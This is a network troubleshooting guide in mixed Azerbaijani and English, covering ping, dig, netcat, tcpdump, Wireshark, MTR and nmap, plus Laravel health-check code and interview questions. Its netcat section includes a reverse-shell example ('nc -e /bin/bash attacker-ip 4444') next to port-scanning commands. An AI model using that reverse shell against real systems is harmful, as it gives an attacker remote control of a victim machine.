# Network Troubleshooting

## Nədir? (What is it?)

Network troubleshooting şəbəkə problemlərini identificasiya, diaqnoz və həll etmə prosesidir. Sistem admin, DevOps və backend developer üçün kritik bacarıqdır. OSI layer-ə görə yanaşma - problem hansı layer-dədir: physical, data link, network, transport, application?

```
Typical troubleshooting flow:

1. Define problem - Nə işləmir? Nə vaxtdan?
2. Gather info    - Error messages, logs, affected users
3. Establish theory - Hipotez yarat
4. Test theory    - Tools ilə yoxla (ping, traceroute, dig)
5. Implement fix  - Əsas səbəbi həll et
6. Verify        - Problem həll olundu?
7. Document      - Gələcək üçün yaz
```

## Necə İşləyir? (How does it work?)

### 1. ping (ICMP Echo)

```
ping: Host reachability test edir, ICMP Echo Request göndərir.

$ ping google.com
PING google.com (142.250.80.46) 56(84) bytes of data.
64 bytes from lga25s72-in-f14.1e100.net (142.250.80.46): icmp_seq=1 ttl=114 time=5.23 ms
64 bytes from lga25s72-in-f14.1e100.net (142.250.80.46): icmp_seq=2 ttl=114 time=5.15 ms
64 bytes from lga25s72-in-f14.1e100.net (142.250.80.46): icmp_seq=3 ttl=114 time=5.20 ms

--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 5.150/5.193/5.230/0.033 ms

Key info:
  - Host reachable (packets received)
  - RTT (round-trip time)
  - Packet loss %
  - TTL (time to live, hops indicator)

Options:
  -c 5         Send only 5 packets
  -i 0.2       Interval between packets
  -s 1400      Packet size
  -M do        Don't fragment (PMTU discovery)
  -W 1         Timeout 1 second
  -4 / -6      Force IPv4/IPv6

Common scenarios:

# Check if host is up
ping -c 1 example.com

# Find MTU
ping -M do -s 1472 example.com    # works for MTU 1500
ping -M do -s 1473 example.com    # fails - packet too big

# Packet loss analysis
ping -c 100 example.com | tail -2

# Note: Some hosts block ICMP (firewall), so "no response" != "host down"
```

### 2. traceroute / tracert

```
traceroute: Packet-in destination-a gedən yolunu göstərir (hop-by-hop).

$ traceroute google.com
traceroute to google.com (142.250.80.46), 30 hops max, 60 byte packets
 1  router.local (192.168.1.1)  1.234 ms  1.123 ms  1.098 ms
 2  10.0.0.1 (10.0.0.1)  5.234 ms  5.123 ms  5.098 ms
 3  isp-gw.example.net (203.0.113.1)  10.234 ms
 4  * * *
 5  ae-1.r01.nyc.example.net (198.51.100.5)  15.234 ms
 6  142.250.80.46 (142.250.80.46)  20.123 ms

How it works:
  - Sends packets with TTL=1, 2, 3, ...
  - Each router decrements TTL, when TTL=0 sends "ICMP Time Exceeded"
  - traceroute records source of that ICMP = hop

Reading:
  * * *           = hop didn't respond (firewall/ICMP filter)
  ms              = round-trip time
  TTL column      = number of hops

Options:
  -n              No DNS resolution (faster)
  -I              Use ICMP instead of UDP
  -T -p 443       TCP SYN (useful when ICMP blocked)
  -q 1            1 probe per hop instead of 3

MTR (My TraceRoute) - better:
  $ mtr google.com
  Continuous traceroute + statistics per hop
  Shows packet loss at each hop
```

### 3. nslookup / dig

```
DNS query tools.

nslookup (simpler):
$ nslookup google.com
Server:         1.1.1.1
Address:        1.1.1.1#53

Non-authoritative answer:
Name:   google.com
Address: 142.250.80.46

dig (preferred, detailed):
$ dig google.com

; <<>> DiG 9.18 <<>> google.com
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12345
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;google.com.                    IN      A

;; ANSWER SECTION:
google.com.             300     IN      A       142.250.80.46

;; Query time: 15 msec
;; SERVER: 1.1.1.1#53(1.1.1.1)

Common dig commands:

dig google.com                 # A record
dig google.com MX              # MX records
dig google.com NS              # Name servers
dig google.com AAAA            # IPv6
dig google.com ANY             # All records
dig -x 8.8.8.8                 # Reverse DNS (PTR)
dig @8.8.8.8 google.com        # Use specific DNS server
dig +trace google.com          # Trace from root servers
dig +short google.com          # Short output

Troubleshoot DNS:
  1. App resolves name incorrectly
     dig domain → compare with expected IP

  2. DNS propagation check
     dig @8.8.8.8 domain   # Google
     dig @1.1.1.1 domain   # Cloudflare
     dig @208.67.222.222 domain  # OpenDNS

  3. DNSSEC validation
     dig +dnssec google.com

  4. Authoritative answer
     dig NS google.com
     dig @ns1.google.com google.com
```

### 4. telnet

```
telnet: TCP port reachability test (interactive).

$ telnet example.com 80
Trying 93.184.216.34...
Connected to example.com.
Escape character is '^]'.
GET / HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
Content-Type: text/html
...

Use cases:
  - Test if port is open
  - Manually test HTTP, SMTP, POP3
  - Check firewall rules

Exit: Ctrl+] then type "quit"

Limitations:
  - No TLS support
  - Plain text protocols only
  - Deprecated in favor of nc (netcat)
```

### 5. netcat (nc)

```
nc (netcat): "Swiss Army knife" of networking. TCP/UDP read/write.

Test port:
  nc -zv example.com 80              # Check TCP port 80
  nc -zvu example.com 53             # UDP port 53
  nc -z example.com 20-30            # Port range scan

Simple HTTP request:
  echo -e "GET / HTTP/1.0\r\n\r\n" | nc example.com 80

File transfer:
  # Receiver
  nc -l 1234 > file.txt
  # Sender
  nc receiver-ip 1234 < file.txt

Chat server:
  # Server
  nc -l 5000
  # Client
  nc server-ip 5000

Port scanner:
  nc -zvn 192.168.1.1 1-1000

Reverse shell (for testing):
  # Attacker listens
  nc -lvnp 4444
  # Victim
  nc -e /bin/bash attacker-ip 4444

Banner grabbing:
  nc example.com 22
  # SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
```

### 6. tcpdump

```
tcpdump: Packet capture and analysis (CLI).

Basic capture:
  tcpdump -i eth0                      # All traffic on eth0
  tcpdump -i any                       # All interfaces
  tcpdump -n                           # Don't resolve names (fast)
  tcpdump -v                           # Verbose
  tcpdump -w capture.pcap              # Save to file
  tcpdump -r capture.pcap              # Read from file

Filters (BPF - Berkeley Packet Filter):

Host:
  tcpdump host 192.168.1.1
  tcpdump src 192.168.1.1
  tcpdump dst 192.168.1.1

Port:
  tcpdump port 80
  tcpdump src port 443
  tcpdump dst port 53

Protocol:
  tcpdump tcp
  tcpdump udp
  tcpdump icmp

Combined:
  tcpdump 'tcp and port 80 and host example.com'
  tcpdump 'port 80 or port 443'
  tcpdump 'host 192.168.1.1 and not port 22'

HTTP traffic:
  tcpdump -A -s 0 'tcp port 80'

DNS queries:
  tcpdump -i any port 53

Specific TCP flags:
  tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'    # SYN packets

Common diagnostic:
  tcpdump -i any -n host 1.2.3.4 and port 5432 -w db.pcap
  # Then analyze with Wireshark

Warning: Production-da sudo required, performance impact.
```

### 7. Wireshark

```
Wireshark: GUI packet analyzer (tcpdump-in görünüşlü versiyası).

Features:
  - Live capture + offline analysis
  - Protocol dissection (1000+ protocols)
  - Follow stream (TCP, HTTP, SSL)
  - Statistics, flow graphs
  - Display filters

Display filters (different syntax than tcpdump):
  ip.addr == 192.168.1.1
  tcp.port == 80
  http.request.method == "POST"
  tls.handshake.type == 1       # Client Hello
  dns.qry.name == "example.com"
  ip.src == 10.0.0.1 and tcp.port == 443

Useful workflows:

1. HTTP debugging:
   Filter: http
   Right-click → Follow → HTTP Stream

2. TLS handshake analysis:
   Filter: tls.handshake

3. Slow connection diagnosis:
   Statistics → TCP Stream Graphs → Round Trip Time

4. Packet loss:
   Filter: tcp.analysis.retransmission

5. Export:
   File → Export Packet Dissections → JSON/CSV

Tip: capture headless with tcpdump, analyze with Wireshark:
  $ tcpdump -i eth0 -w capture.pcap
  $ wireshark capture.pcap
```

### 8. MTR (My TraceRoute)

```
MTR: traceroute + ping combined, real-time statistics.

$ mtr google.com
                                 My traceroute  [v0.95]
server1 (192.168.1.10)                                2024-03-15 10:30:00
Keys:  Help   Display mode   Restart statistics   Order of fields   quit
                                       Packets               Pings
 Host                                Loss%   Snt   Last   Avg  Best  Wrst StDev
 1. router.local                      0.0%    10    1.2   1.3   1.1   1.5   0.1
 2. 10.0.0.1                          0.0%    10    5.2   5.3   5.1   5.5   0.1
 3. isp-gw                           10.0%    10   10.2  10.3  10.1  12.5   0.8
 4. ???                              100.0%   10    0.0   0.0   0.0   0.0   0.0
 5. 142.250.80.46                     0.0%    10   20.2  20.3  20.1  20.5   0.1

Reading:
  Loss% : Packet loss per hop
  Snt   : Packets sent
  Last  : Last RTT
  Avg   : Average RTT
  Best  : Best RTT
  Wrst  : Worst RTT

Key insight: Loss at hop 3 (ISP gateway).
  - If later hops have 0%, just router not responding (firewall) - fine
  - If later hops also have loss - real packet loss

Options:
  mtr -n               No DNS
  mtr -c 100           100 probes
  mtr -r               Report mode (one-shot)
  mtr -T -P 443        TCP mode, port 443
```

### 9. Other Useful Tools

```
ip / ifconfig (network interfaces):
  ip addr show                  # Show all interfaces (Linux)
  ip route                      # Routing table
  ip neigh                      # ARP table
  ifconfig                      # Legacy (deprecated)

ss / netstat (sockets):
  ss -tuln                      # Listening TCP/UDP
  ss -tp                        # TCP with processes
  ss -s                         # Summary stats
  netstat -rn                   # Routing table
  netstat -anp                  # All connections

arp:
  arp -a                        # ARP cache
  ip neigh                      # Modern equivalent

curl:
  curl -v https://example.com   # Verbose (headers, TLS)
  curl -I https://example.com   # HEAD only
  curl -w "@-" <<'EOF' -o /dev/null -s https://example.com
  time_namelookup: %{time_namelookup}\n
  time_connect: %{time_connect}\n
  time_appconnect: %{time_appconnect}\n
  time_starttransfer: %{time_starttransfer}\n
  time_total: %{time_total}\n
  EOF

openssl (TLS):
  openssl s_client -connect example.com:443
  openssl x509 -in cert.pem -text -noout

nmap (port scanner):
  nmap -sT example.com           # TCP connect scan
  nmap -sS example.com           # SYN stealth scan
  nmap -p 80,443 example.com     # Specific ports
  nmap -A example.com            # Aggressive (OS, version)

iperf3 (bandwidth testing):
  # Server:  iperf3 -s
  # Client:  iperf3 -c server-ip -t 30
```

### 10. Common Issues and Diagnosis

```
Issue 1: "Cannot connect to server"
  1. ping server                 # Network reachable?
  2. nc -zv server port          # Port open?
  3. traceroute server           # Route OK?
  4. dig server                  # DNS correct?
  5. Check server firewall
  6. Check server service running

Issue 2: "Slow website"
  1. curl -w timing              # Where is slow?
  2. mtr target                  # Packet loss?
  3. dig target                  # DNS slow?
  4. tcpdump retransmissions     # Network issue?
  5. Server-side: application logs, DB slow query

Issue 3: "Intermittent connection"
  1. mtr -c 1000 target          # Packet loss pattern?
  2. Check DHCP lease
  3. Check DNS caching
  4. Monitor with ping long-term

Issue 4: "SSL/TLS errors"
  1. openssl s_client -connect host:443
     Check cert expiry, chain, CN match
  2. Check system time (cert validation)
  3. Check root CA trust store
  4. curl -v to see handshake

Issue 5: "DNS not resolving"
  1. cat /etc/resolv.conf        # DNS servers
  2. dig @8.8.8.8 domain         # Different DNS
  3. dig +trace domain           # Full chain
  4. nslookup domain             # Alternative tool
  5. systemctl status systemd-resolved  # Linux DNS service
```

## Əsas Konseptlər (Key Concepts)

### OSI Layer-based Troubleshooting

```
Bottom-up approach:

Layer 1 (Physical):
  - Cable connected?
  - Link lights?
  - ip link show

Layer 2 (Data Link):
  - MAC address
  - ARP table: arp -a
  - Switch config

Layer 3 (Network):
  - IP address: ip addr
  - Routing: ip route
  - ICMP: ping, traceroute

Layer 4 (Transport):
  - TCP/UDP ports: ss, netstat
  - Connection state
  - nc, telnet

Layer 5-7 (Session/Application):
  - Application logs
  - curl -v, browser devtools
  - tcpdump -A (ASCII)
```

### Latency Components

```
Total latency = DNS + TCP + TLS + Request + Response + Processing

DNS: ~10-50ms (cacheable)
TCP handshake: 1 RTT
TLS handshake: 1-2 RTT (TLS 1.3: 1 RTT)
Request upload: depends on size
Server processing: depends on app
Response download: depends on size + bandwidth

curl -w helps identify bottleneck:
  time_namelookup   = DNS
  time_connect      = DNS + TCP
  time_appconnect   = DNS + TCP + TLS
  time_pretransfer  = above + request sent
  time_starttransfer = above + first byte received
  time_total        = entire request
```

### Error Code Taxonomy

```
HTTP codes:
  4xx - Client error
    400 Bad Request      → Check request format
    401 Unauthorized     → Auth credentials
    403 Forbidden        → Permissions
    404 Not Found        → Wrong URL or missing
    408 Request Timeout  → Client too slow
    429 Too Many Requests → Rate limit

  5xx - Server error
    500 Internal Error   → Check server logs
    502 Bad Gateway      → Upstream (proxy to app) issue
    503 Unavailable      → Overloaded, maintenance
    504 Gateway Timeout  → Upstream slow/down

TCP errors:
  Connection refused    → Nothing listening on port
  Connection reset      → Service crashed or firewall RST
  Connection timeout    → Network issue, firewall drop
  No route to host      → Routing issue
```

### Packet Loss vs Latency

```
High latency, low loss:
  Distance, slow route
  Fix: CDN, different route

Low latency, high loss:
  Cable issue, faulty hardware
  Fix: Replace hardware

High both:
  Congestion, overloaded path
  Fix: QoS, alternative path, off-peak

Use MTR to identify the hop:
  Loss at intermediate hops without loss at destination = router filtering ICMP (OK)
  Loss at destination + hops = real problem
```

## PHP/Laravel ilə İstifadə

### Connection Test Script

```php
// app/Console/Commands/NetworkCheck.php
namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;

class NetworkCheck extends Command
{
    protected $signature = 'network:check';

    public function handle()
    {
        $checks = [
            'DB' => fn() => $this->checkDb(),
            'Redis' => fn() => $this->checkRedis(),
            'Mailer' => fn() => $this->checkMailer(),
            'S3' => fn() => $this->checkHttp('https://s3.amazonaws.com'),
            'DNS' => fn() => $this->checkDns('google.com'),
        ];

        foreach ($checks as $name => $check) {
            try {
                $result = $check();
                $this->info("[OK] {$name}: {$result}");
            } catch (\Exception $e) {
                $this->error("[FAIL] {$name}: {$e->getMessage()}");
            }
        }
    }

    private function checkDb(): string
    {
        $start = microtime(true);
        \DB::select('SELECT 1');
        $ms = round((microtime(true) - $start) * 1000, 2);
        return "{$ms}ms";
    }

    private function checkRedis(): string
    {
        $start = microtime(true);
        \Cache::store('redis')->put('health_check', 1, 1);
        $ms = round((microtime(true) - $start) * 1000, 2);
        return "{$ms}ms";
    }

    private function checkMailer(): string
    {
        $transport = \Mail::mailer()->getSymfonyTransport();
        return get_class($transport);
    }

    private function checkHttp(string $url): string
    {
        $start = microtime(true);
        $response = Http::timeout(5)->get($url);
        $ms = round((microtime(true) - $start) * 1000, 2);
        return "HTTP {$response->status()} in {$ms}ms";
    }

    private function checkDns(string $host): string
    {
        $start = microtime(true);
        $ip = gethostbyname($host);
        $ms = round((microtime(true) - $start) * 1000, 2);
        if ($ip === $host) throw new \Exception("DNS failed");
        return "{$host} -> {$ip} ({$ms}ms)";
    }
}

// Usage: php artisan network:check
```

### HTTP Request Timing (curl-like)

```php
use Illuminate\Support\Facades\Http;

$response = Http::withOptions([
    'on_stats' => function (\GuzzleHttp\TransferStats $stats) {
        $handler = $stats->getHandlerStats();
        logger()->info('HTTP Timing', [
            'url' => $stats->getEffectiveUri(),
            'total' => $stats->getTransferTime(),
            'dns' => $handler['namelookup_time'] ?? null,
            'connect' => $handler['connect_time'] ?? null,
            'tls' => $handler['appconnect_time'] ?? null,
            'pretransfer' => $handler['pretransfer_time'] ?? null,
            'starttransfer' => $handler['starttransfer_time'] ?? null,
        ]);
    }
])->get('https://api.example.com/users');
```

### Port Checker

```php
function isPortOpen(string $host, int $port, int $timeout = 5): bool
{
    $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);

    if ($fp) {
        fclose($fp);
        return true;
    }

    return false;
}

// Usage
if (!isPortOpen('db.example.com', 5432)) {
    logger()->alert('Database unreachable');
}
```

### DNS Resolution Check

```php
function checkDns(string $host): array
{
    $records = [
        'A' => @dns_get_record($host, DNS_A),
        'AAAA' => @dns_get_record($host, DNS_AAAA),
        'MX' => @dns_get_record($host, DNS_MX),
        'TXT' => @dns_get_record($host, DNS_TXT),
        'NS' => @dns_get_record($host, DNS_NS),
    ];

    return $records;
}

// Check SPF record
$txts = dns_get_record('example.com', DNS_TXT);
foreach ($txts as $record) {
    if (str_starts_with($record['txt'], 'v=spf1')) {
        echo "SPF found: " . $record['txt'];
    }
}
```

### Ping Implementation

```php
// Note: PHP cannot send ICMP without root. Alternatives:

// 1. TCP ping (port check)
function tcpPing(string $host, int $port = 80): ?float
{
    $start = microtime(true);
    $fp = @fsockopen($host, $port, $errno, $errstr, 5);

    if (!$fp) return null;

    fclose($fp);
    return (microtime(true) - $start) * 1000; // ms
}

// 2. Use system ping (shell)
function ping(string $host, int $count = 3): ?array
{
    $count = (int) $count;
    $output = [];
    exec("ping -c {$count} -W 1 " . escapeshellarg($host) . " 2>&1", $output, $rc);

    if ($rc !== 0) return null;

    // Parse avg rtt
    $last = end($output);
    if (preg_match('/= [\d.]+\/([\d.]+)\/[\d.]+/', $last, $m)) {
        return ['avg_ms' => (float) $m[1], 'output' => $output];
    }

    return ['output' => $output];
}
```

### Laravel Monitoring Endpoint

```php
// routes/web.php
Route::get('/health', [HealthController::class, 'check']);

// app/Http/Controllers/HealthController.php
class HealthController extends Controller
{
    public function check()
    {
        $status = [
            'app' => 'ok',
            'timestamp' => now()->toIso8601String(),
            'checks' => [],
        ];

        $overallOk = true;

        // Database
        try {
            DB::connection()->getPdo();
            $status['checks']['database'] = 'ok';
        } catch (\Exception $e) {
            $status['checks']['database'] = 'fail: ' . $e->getMessage();
            $overallOk = false;
        }

        // Redis
        try {
            Redis::ping();
            $status['checks']['redis'] = 'ok';
        } catch (\Exception $e) {
            $status['checks']['redis'] = 'fail: ' . $e->getMessage();
            $overallOk = false;
        }

        // Disk space
        $free = disk_free_space('/');
        $total = disk_total_space('/');
        $percent = round((1 - $free / $total) * 100, 2);
        $status['checks']['disk'] = "{$percent}% used";
        if ($percent > 90) $overallOk = false;

        return response()->json($status, $overallOk ? 200 : 503);
    }
}
```

## Interview Sualları

**Q1: ping və traceroute fərqi?**

**ping**: Host reachability test. ICMP Echo Request göndərir, RTT ölçür. Yalniz başlanğıc və son arasındaki yol məlumatı verir (latency, loss).

**traceroute**: Path discovery. Destination-a gedən hop-ları göstərir. TTL manipulation ilə hər router-i identifikasiya edir.

İstifadə:
- ping: "Host up?"
- traceroute: "Hansı yol ilə gedir? Hansı hop-da problem?"

Birlikdə: MTR (ikisini birləşdirir).

**Q2: DNS problem-ləri necə diaqnoz etmək?**

Addımlar:
1. **Local cache**: `systemd-resolve --flush-caches`
2. **Explicit DNS**: `dig @8.8.8.8 domain` - digər DNS server ilə test
3. **Propagation**: Multiple DNS server (Google 8.8.8.8, Cloudflare 1.1.1.1)
4. **Full trace**: `dig +trace domain` - root-dən getir
5. **Authoritative**: `dig NS domain`, then `dig @ns1 domain`
6. **Records**: A, AAAA, MX, TXT, CNAME hamısını yoxla
7. **TTL check**: Yüksək TTL-də köhnə data cache-də

**Q3: `nc` vs `telnet` fərqi?**

**telnet**: Interactive, plain text. Legacy. Limited options. Protokol-specific problems (binary data, CRLF issues).

**nc (netcat)**: Daha fleksibel, scripting-friendly.
- TCP və UDP
- Port scanning (`-z`)
- File transfer
- Server mode (`-l`)
- Pipe-friendly

Modern istifadə: `nc` preferred. Telnet depricated in many systems.

**Q4: tcpdump ilə HTTPS trafic-i debug etmək olar?**

**Yox** (tam mənada). tcpdump encrypted payload görür, decrypt edə bilmir.

Görə bilən:
- TCP handshake
- TLS handshake (Client Hello, Server Hello, cert)
- SNI (hostname)
- Packet sizes, timing

Görə bilməyən: Actual HTTP headers, body.

**Həllər**:
1. TLS termination-dan əvvəl/sonra capture (load balancer arxasında)
2. SSLKEYLOGFILE ilə Wireshark-a key ver
3. mitmproxy (Man-in-the-Middle proxy) debug üçün
4. App-də detailed logging

**Q5: "Connection refused" vs "Connection timeout" fərqi?**

**Connection refused** (TCP RST): Port-a heç nə qulaq asmır. Server aktiv, amma service down. Dərhal cavab.

**Connection timeout**: Heç cavab yoxdur. Səbəblər:
- Firewall packet drop (stealth)
- Network partition
- Host down
- Wrong IP

Diagnosis:
```
nc -zv host port
# Refused: service not running
# Timeout: firewall or network issue
```

**Q6: MTU problemi necə identifikasiya etmək?**

Symptoms:
- SSH works, HTTPS hang
- Small files OK, large transfer fails
- Some websites load, others don't

Test:
```bash
# Don't fragment flag, packet size
ping -M do -s 1472 target    # 1472 + 28 (IP+ICMP) = 1500
ping -M do -s 1473 target    # should fail if MTU 1500

# Binary search for MTU
ping -M do -s 1400 target    # pass
ping -M do -s 1450 target    # ?
```

Fix:
- Lower interface MTU (`ip link set eth0 mtu 1400`)
- MSS clamping (TCP)
- VPN MTU adjustment

**Q7: High latency-in səbəbləri nələr ola bilər?**

Səviyyələrlə:
1. **Physical distance**: İşıq sürəti limit (NY→Sydney ~80ms baseline)
2. **Routing**: Suboptimal path, transit AS
3. **Congestion**: Overloaded link
4. **Buffering bloat**: Queue latency routers
5. **DNS resolution**: Slow DNS server
6. **TLS handshake**: Multiple RTT
7. **Server processing**: Slow DB, slow app
8. **Bandwidth**: Large payload

Diagnose:
```
curl -w "@format.txt" -o /dev/null -s URL
mtr target
tcpdump for retransmissions
```

**Q8: Intermittent packet loss necə diaqnoz etmək?**

**Tools**:
```
# Long-term monitor
mtr -c 10000 target

# Specific interval
ping -i 0.2 -c 1000 target | tail -3
```

**Səbəblər**:
1. **Fiziki layer**: Cable, connector
2. **Wireless**: Interference, signal strength
3. **ISP peering**: Transit link congestion
4. **Route flap**: BGP instability
5. **Overloaded router**: Buffer overflow

**Actions**:
- Time-based (gün/gecə difference?)
- Location-based (hop-by-hop, MTR)
- Alternative path test (different DNS, VPN)
- ISP contact with traceroute/MTR data

**Q9: `ss` vs `netstat` fərqi?**

**netstat**: Köhnə, yavaş (procfs iterate). Depricated.

**ss** (Socket Statistics): Modern, sürətli (kernel TCP diag socket). iproute2 package.

Common:
```bash
ss -tuln          # Listening TCP/UDP
ss -tp            # TCP with processes
ss -s             # Summary
ss -4             # IPv4 only
ss 'dport = :443' # Filter by destination port
```

Migrate: `netstat -X` → `ss` equivalent.

**Q10: Production-da network debug necə yaxşı edilir?**

1. **Application layer first**:
   - Logs oxu (structured logging)
   - Request ID tracing
   - APM tool (Datadog, New Relic)

2. **Synthetic monitoring**:
   - Health check endpoint-lər
   - Uptime monitoring (Pingdom, UptimeRobot)
   - Alerting (response time, error rate)

3. **Packet capture minimal**:
   - `tcpdump` with filter (not broad)
   - Limited duration (`-c` count)
   - Write to file, analyze offline

4. **Load balancer logs**:
   - Response time, status codes
   - Upstream errors

5. **Database slow query log**: Application-level latency.

6. **Network metrics** (if available): Cloud provider (AWS CloudWatch, GCP metrics).

7. **Chaos testing**: Prod-əvvəl simulate network issues.

## Best Practices

1. **Standardized diagnostic kit** - team üçün tools, scripts document.

2. **OSI layer systematic** - bottom-up yanaşma (fiziki → app).

3. **Baseline metrics** - normal performance-ı bil (alerting üçün).

4. **Document common issues** - runbook, playbook.

5. **Monitoring + alerting** - problem olduqda bilmək (passively yox).

6. **Correlation** - logs, metrics, traces birlikdə.

7. **Structured logging** - JSON format, queryable.

8. **Request tracing** - distributed tracing (OpenTelemetry, Jaeger).

9. **Synthetic monitoring** - user-perspective tests.

10. **Capture with filter** - tcpdump wide capture = massive file.

11. **Time synchronization** - NTP, logs correlate etmək üçün.

12. **Health endpoints** - /health, /ready, /metrics standard.

13. **Graceful degradation** - dependencies fail olsa partial functionality.

14. **Dependency maps** - hansi service hansina bağlıdır (diagram).

15. **Runbook-driven response** - panic deyil, step-by-step.

16. **Post-mortem culture** - blameless, learn from outages.

17. **Chaos engineering** - controlled failures, weakness aşkar et.

18. **Regular drills** - fire drill, failover test.

19. **Simple tools first** - ping before tcpdump.

20. **Escalation path** - nə vaxt üst səviyyəyə götürmək.
